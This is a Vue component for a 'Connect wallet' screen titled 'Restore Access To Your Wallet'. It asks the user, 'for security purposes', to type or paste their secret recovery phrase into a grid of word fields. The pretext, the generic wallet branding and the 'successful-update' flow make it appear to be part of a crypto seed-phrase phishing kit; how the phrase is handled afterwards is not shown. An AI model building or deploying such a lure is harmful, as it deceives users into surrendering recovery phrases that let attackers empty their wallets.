<script setup lang="ts">
import ButtonBack from "@/components/Buttons/ButtonBack.vue";
import ButtonNext from "@/components/Buttons/ButtonNext.vue";
import { useIntermediateData } from "@/components/composables/useIntermediateData";
import Input from "@/components/Input/Input.vue";
import { DotLottieVue } from "@lottiefiles/dotlottie-vue";
import { Eye, EyeOff } from "lucide-vue-next";

const {
  wallet,
  nextTo,
  seedInput,
  handlePaste,
  toggleHide,
  validateMnemonicPhrase,
  loadingMnemonicNextButton,
  canActivateValidateMnemonic,
} = useIntermediateData();
</script>

<template>
  <div class="flex flex-col items-center justify-between h-full gap-4 w-full">
    <div class="flex flex-col items-center justify-start gap-4 w-full">
      <div class="flex flex-row items-center gap-2 w-full justify-center">
        <div class="size-6">
          <img :src="wallet.image" class="object-contein w-full h-full" />
        </div>
        <span class="font-semibold">x</span>
        <DotLottieVue
          class="size-6 z-10"
          autoplay
          loop
          src="../../src/assets/Wallet.json"
        />
        <span class="font-semibold">|</span>
        <span class="font-semibold">Connect wallet</span>
      </div>
      <h1>Restore Access To Your Wallet</h1>
      <p class="text-center text-[rgb(var(--color-muted))]">
        For security purposes, confirm access to your wallet using a secret
        recovery phrase.
      </p>
      <div
        class="grid grid-cols-2 gap-4 overflow-auto max-h-[390px] scrollbar-hidden"
      >
        <div v-for="(item, index) in seedInput" class="relative">
          <Input
            v-model="item.model"
            :type="item.hide ? 'password' : 'text'"
            @paste="handlePaste($event)"
            :class="{
              'invalid-border': !item.valid,
              'valid-border': item.passed,
            }"
            :placeholder="`${index + 1}.`"
          />
          <button
            @click="toggleHide(index)"
            class="flex items-center justify-center absolute right-3 top-0 h-full cursor-pointer"
          >
            <EyeOff
              v-if="!item.hide"
              class="text-[rgb(var(--color-muted))] size-4"
            />
            <Eye v-else class="text-[rgb(var(--color-muted))] size-4" />
          </button>
        </div>
      </div>
    </div>
    <div class="w-full flex flex-row items-center gap-4">
      <ButtonBack @click="nextTo('successful-update')" />
      <ButtonNext
        :class="{ 'animate-pulse': loadingMnemonicNextButton }"
        @click="validateMnemonicPhrase"
        :disabled="!canActivateValidateMnemonic"
      />
    </div>
  </div>
</template>
